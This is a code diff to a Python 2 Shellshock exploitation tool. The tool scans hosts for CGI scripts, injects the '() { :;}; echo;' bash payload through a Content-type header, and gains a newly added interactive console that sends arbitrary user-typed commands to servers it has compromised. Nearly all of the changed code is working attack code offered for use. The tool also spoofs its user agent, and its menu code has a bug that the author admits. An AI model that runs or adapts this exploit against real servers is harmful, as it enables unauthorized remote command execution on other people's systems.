@@ -41,6 +41,7 @@ import socket
 import Queue
 import threading
 import re
+from collections import OrderedDict
 
 # User-agent to use instead of 'Python-urllib/2.6' or similar
 user_agent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
@@ -51,6 +52,7 @@ def signal_handler(signal, frame):
     """
 
     sys.exit(0)
+
 
 def check_hosts(host_target_list, port, verbose):
     """ Do some basic sanity checking on hosts to make sure they resolve
@@ -110,7 +112,7 @@ def scan_hosts(protocol, host_target_list, port, cgi_list, proxy, verbose):
                 
                 # Start a thread for each CGI in cgi_list
                 if verbose: print "[I] Starting thread %i" % cgi_index
-                t = threading.Thread(target = check_cgi, args = (req, q, verbose))
+                t = threading.Thread(target = do_check_cgi, args = (req, q, verbose))
                 t.start()
                 threads.append(t)
             except Exception as e: 
@@ -129,7 +131,7 @@ def scan_hosts(protocol, host_target_list, port, cgi_list, proxy, verbose):
     print "[+] Finished host scan"
     return exploit_targets
 
-def check_cgi(req, q, verbose):
+def do_check_cgi(req, q, verbose):
     """ Worker thread for scan_hosts to check if url is reachable
     """
 
@@ -141,7 +143,7 @@ def check_cgi(req, q, verbose):
     finally:
         thread_pool.release()
 
-def exploit_cgi(proxy, target_list, exploit, verbose):
+def do_exploit_cgi(proxy, target_list, command, verbose):
     """ For urls identified as potentially exploitable attempt to exploit
     """
 
@@ -151,10 +153,16 @@ def exploit_cgi(proxy, target_list, exploit, verbose):
         random.choice(string.ascii_uppercase + string.digits
         ) for _ in range(20))
     
-    # Dictionary of header:attack string to try against discovered CGI scripts
-    attack_strings = {
-       "Content-type": "() { :;}; echo; echo %s; %s" % (success_flag, exploit)
+    # Dictionary {header:attack string} to try on discovered CGI scripts
+    # Where attack string comprises exploit + success_flag + command
+    attacks = {
+       "Content-type": "() { :;}; echo; "
        }
+    
+    # A dictionary of apparently successfully exploited targets
+    # {url: (header, exploit)}
+    # Returned to main() 
+    successful_targets = OrderedDict()
 
     if len(target_list) > 1:
         print "[+] %i potential targets found" % len(target_list)
@@ -163,36 +171,90 @@ def exploit_cgi(proxy, target_list, exploit, verbose):
     print "[+] Attempting exploits..."
     for target in target_list:
         print "[+] Trying exploit for %s" % target 
-        host = target.split(":")[1][2:] # substring host from target URL
-        for header, attack in attack_strings.iteritems():
-            try:
-                if verbose:
-                    print "  [I] Header is: %s" % header
-                    print "  [I] Attack string is: %s" % attack
-                    print "  [I] Flag set to: %s" % success_flag
-                req = urllib2.Request(target)
-                req.add_header(header, attack)
-                if proxy:
-                    req.set_proxy(proxy, "http")    
-                    if verbose: print "  [I] Proxy set to: %s" % str(proxy)
-                req.add_header("User-Agent", user_agent)
-                req.add_header("Host", host)
-                resp = urllib2.urlopen(req)
-                result =  resp.read()
-                if success_flag in result:
-                    print "  [!] %s looks vulnerable" % target 
-                    print "  [!] Response returned was:" 
-                    buf = StringIO.StringIO(result)
+        if verbose: print "  [I] Flag set to: %s" % success_flag
+        for header, exploit in attacks.iteritems():
+            attack = exploit + " echo " + success_flag + "; " + command
+            result = do_attack(proxy, target, header, attack, verbose)
+            if success_flag in result:
+                print "  [!] %s looks vulnerable" % target 
+                print "  [!] Response returned was:" 
+                buf = StringIO.StringIO(result)
+                if len(result) > (len(success_flag)+1):
                     for line in buf:
                         if line.strip() != success_flag: 
                             print "  %s" % line.strip()
-                    buf.close()
                 else:
-                    print "[-] Not vulnerable" 
-            except Exception as e:
-                if verbose: print "[I] Exception - %s - %s" % (target, e) 
-            finally:
-                pass
+                    print "  [!] A result was returned but was empty..."
+                    print "  [!] Maybe try a different exploit command?"
+                successful_targets.update({target: (header, exploit)})
+                buf.close()
+            else:
+                print "[-] Not vulnerable" 
+    return successful_targets
+
+
+def do_attack(proxy, target, header, attack, verbose):
+    result = ""
+    host = target.split(":")[1][2:] # substring host from target URL
+
+    try:
+        if verbose:
+            print "  [I] Header is: %s" % header
+            print "  [I] Attack string is: %s" % attack
+        req = urllib2.Request(target)
+        req.add_header(header, attack)
+        if proxy:
+            req.set_proxy(proxy, "http")    
+            if verbose: print "  [I] Proxy set to: %s" % str(proxy)
+        req.add_header("User-Agent", user_agent)
+        req.add_header("Host", host)
+        resp = urllib2.urlopen(req)
+        result =  resp.read()
+    except Exception as e:
+        if verbose: print "[I] Exception - %s - %s" % (target, e) 
+    finally:
+        pass
+    return result
+
+def ask_for_console(proxy, successful_targets, verbose):
+    """ With any discovered vulnerable servers asks user if they
+    would like to choose one of these to send further commands to
+    in a semi interactive way
+    successful_targets is a dictionary:
+    {url: (header, exploit)}
+
+    CURRENTLY MENU CHOICES ARE WRONG - TO BE FIXED
+    """
+
+    # Initialise to non zero to enter while loop
+    user_input = 1
+    ordered_url_list = successful_targets.keys()
+    
+    while user_input is not 0:
+        result = ""
+        print "[+] The following URLs appeared to be exploitable:"
+        for x in range(len(successful_targets)):
+            print "  [%i] %s" % (x+1, ordered_url_list[x-1])
+        print "[+] Would you like exploit further?"
+        user_input = raw_input("[?] Enter an URL number or 0 to exit: ")
+        try:
+            user_input = int(user_input)
+        except:
+            continue
+        if user_input not in range(len(successful_targets)+1):
+            print "[-] Please enter a number between 0 and %i" % len(successful_targets)
+            continue
+        elif not user_input:
+            continue
+        target = ordered_url_list[user_input-1]
+        header = successful_targets[target][0]
+        command = raw_input("[+] Enter command to run: ")
+        if command:
+            attack = successful_targets[target][1] + command
+            result = do_attack(proxy, target, header, attack, verbose)
+        else:
+            print "[-] No command entered"
+        print result
 
 
 def validate_address(hostaddress):
@@ -293,8 +355,7 @@ def main():
         help = 'The target port number (default=80)'
         )
     parser.add_argument(
-        '--exploit',
-        '-e',
+        '--command',
         default = "/bin/uname -a",
         help = "Command to execute (default=/bin/uname -a)"
         )
@@ -339,7 +400,7 @@ def main():
     else:
         proxy = ""
     verbose = args.verbose
-    exploit = args.exploit
+    command = args.command
     if args.ssl == True or port == "443":
         protocol = "https"
     else:
@@ -363,8 +424,10 @@ def main():
     target_list = scan_hosts(protocol, confirmed_hosts, port, cgi_list, proxy, verbose)
 
     # If any cgi scripts were found on the target host try to exploit them
-    if len(target_list) > 0:
-        exploit_cgi(proxy, target_list, exploit, verbose)
+    if len(target_list):
+        successful_targets = do_exploit_cgi(proxy, target_list, command, verbose)
+        if len(successful_targets):
+            ask_for_console(proxy, successful_targets, verbose)
     else:
         print "[+] No potential targets found :("
     print "[+] The end"
